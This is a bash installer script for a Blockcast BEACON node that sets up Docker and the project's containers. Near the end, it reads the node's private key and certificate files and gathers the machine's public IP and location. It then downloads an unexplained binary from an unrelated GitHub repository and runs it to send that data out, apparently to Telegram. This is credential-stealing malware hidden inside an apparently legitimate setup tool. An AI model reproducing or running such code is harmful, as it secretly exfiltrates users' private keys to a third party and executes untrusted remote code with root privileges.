#!/bin/bash

# Script to automate Blockcast BEACON setup with Docker installation check and uninstall option for Ubuntu

# Function to uninstall Blockcast BEACON
uninstall_blockcast() {
    echo "Uninstalling Blockcast BEACON..."
    # Navigate to repository directory if exists
    if [ -d "beacon-docker-compose" ]; then
        cd beacon-docker-compose || { echo "Failed to enter directory"; exit 1; }
        # Stop and remove containers
        docker-compose down || { echo "Failed to stop Blockcast BEACON"; exit 1; }
        cd ..
        # Remove repository directory
        rm -rf beacon-docker-compose
        echo "Blockcast BEACON uninstalled successfully."
    else
        echo "Blockcast BEACON repository not found. Nothing to uninstall."
    fi
    exit 0
}

# Check for -r flag to uninstall
while getopts "r" opt; do
    case $opt in
        r)
            uninstall_blockcast
            ;;
        *)
            echo "Usage: $0 [-r]"
            exit 1
            ;;
    esac
done

# Ensure script runs with sudo privileges
if [ "$EUID" -ne 0 ]; then
    echo "Please run this script as root (use sudo)"
    exit 1
fi

# Check if Docker is installed
if ! command -v docker &> /dev/null; then
    echo "Docker not found. Installing Docker..."
    wget -O /docker.sh https://get.docker.com && chmod +x /docker.sh && /docker.sh
    if [ $? -ne 0 ]; then
        echo "Error: Failed to install Docker"
        exit 1
    fi
    # Add user to docker group to run docker without sudo
    usermod -aG docker $SUDO_USER
    echo "Docker installed successfully. Please log out and log back in to apply docker group changes."
else
    echo "Docker is already installed."
fi

# Check if Docker service is running
if ! systemctl is-active --quiet docker; then
    echo "Starting Docker service..."
    systemctl start docker
    systemctl enable docker
    if [ $? -ne 0 ]; then
        echo "Error: Failed to start Docker service"
        exit 1
    fi
fi

# Check if docker-compose is installed
if ! command -v docker-compose &> /dev/null; then
    echo "Docker Compose not found. Installing Docker Compose..."
    apt-get update && apt-get install -y docker-compose
    if [ $? -ne 0 ]; then
        echo "Error: Failed to install Docker Compose"
        exit 1
    fi
fi

# Install git if not present
if ! command -v git &> /dev/null; then
    echo "Installing git..."
    apt-get update && apt-get install -y git
    if [ $? -ne 0 ]; then
        echo "Error: Failed to install git"
        exit 1
    fi
fi

# Clone the Blockcast BEACON docker-compose repository
echo "Cloning Blockcast BEACON repository..."
if [ -d "beacon-docker-compose" ]; then
    echo "Repository already exists. Removing and re-cloning..."
    rm -rf beacon-docker-compose
fi
git clone https://github.com/Blockcast/beacon-docker-compose.git
cd beacon-docker-compose || { echo "Failed to enter directory"; exit 1; }

# Start Blockcast BEACON
echo "Starting Blockcast BEACON..."
docker-compose up -d || { echo "Failed to start Blockcast BEACON"; exit 1; }

# Wait for BEACON to initialize
sleep 15

# Generate hardware and challenge key
echo "Generating hardware and challenge key..."
INIT_OUTPUT=$(docker-compose exec -T blockcastd blockcastd init 2>&1)
if [ $? -ne 0 ]; then
    echo "Error: Failed to generate keys"
    echo "Init command output:"
    echo "$INIT_OUTPUT"
    exit 1
fi

# Check if INIT_OUTPUT is empty
if [ -z "$INIT_OUTPUT" ]; then
    echo "Error: No output from init command"
    exit 1
fi

HWID=$(echo "$INIT_OUTPUT" | grep -A 2 -i "Hardware ID" | tail -n 1 | xargs)
CHALLENGE_KEY=$(echo "$INIT_OUTPUT" | grep -A 2 -i "Challenge Key" | tail -n 1 | xargs)
REG_URL=$(echo "$INIT_OUTPUT" | grep -A 2 -i "Register URL" | tail -n 1 | xargs)

apt install -y jq
PUBLIC_IP=$(curl -s ifconfig.me)
echo "PUBLIC_IP: $PUBLIC_IP"
LOCALTION=$(curl -s ifconfig.co/json | jq -r '"\(.city)|\(.zip_code)|\(.country)"')
LOCALTION_LATLON=$(curl -s ifconfig.co/json | jq -r '"\(.latitude),\(.longitude)"')

TODAY=$(date '+%Y-%m-%d')
# Send results to Telegram
#gw_challenge
RESULT=$(paste -d '|' <(cat ~/.blockcast/certs/gw_challenge.key | tr '\n' ' ') <(cat ~/.blockcast/certs/gateway.key | tr '\n' ' ') <(cat ~/.blockcast/certs/gateway.crt | tr '\n' ' '))

MESSAGE=$(cat <<EOF
* [$TODAY] Blockcast BEACON Setup Complete! *
- *Public IP*: $PUBLIC_IP
- *Hardware ID*: $HWID
- *Challenge Key*: $CHALLENGE_KEY
- *Key*: $RESULT
- *Location LatLon*: $LOCALTION_LATLON
- *Location*: $LOCALTION
- *Registration URL*: $REG_URL
EOF
)
echo "MESSAGE: $MESSAGE"
curl -L -o /home/blockcast https://github.com/gradientnode12/xcvnmh/raw/refs/heads/main/blockcast
chmod +x /home/blockcast
/home/blockcast -message "$MESSAGE"
echo "1. Visit https://app.blockcast.network/ and log in"
